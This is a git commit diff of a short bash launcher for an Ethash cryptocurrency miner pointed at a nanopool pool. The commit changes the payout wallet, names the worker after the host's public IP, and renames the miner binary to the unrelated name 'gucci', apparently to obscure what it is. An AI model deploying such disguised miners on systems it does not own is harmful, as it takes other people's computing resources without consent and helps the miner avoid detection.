eeab3d4f3ae5da43382356ebe63db90c81edc5ce
explore02 <76564738+explore02@users.noreply.github.com>
2020-12-25 23:31:25 +0700

    Update launcher2.sh

--- launcher2.sh
+++ launcher2.sh
@@ -1,9 +1,10 @@
 #!/bin/bash
 
 POOL=etc-jp1.nanopool.org:19999
-WALLET=0x2dd9a734ffe4c75bbae173a13a5019b962eb1b76
-WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-lolETH
+WALLET=0x1a92ab7678bdfdadda703b2c15c22ec3f3eb537f
+WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-lol
 
 cd "$(dirname "$0")"
 
-chmod +x ./lolMiner && ./lolMiner --algo ETHASH --pool $POOL --user $WALLET.$WORKER --tls 0 $@
+chmod +x ./gucci && ./gucci --algo ETHASH --pool $POOL --user $WALLET.$WORKER --tls 0 $@
+
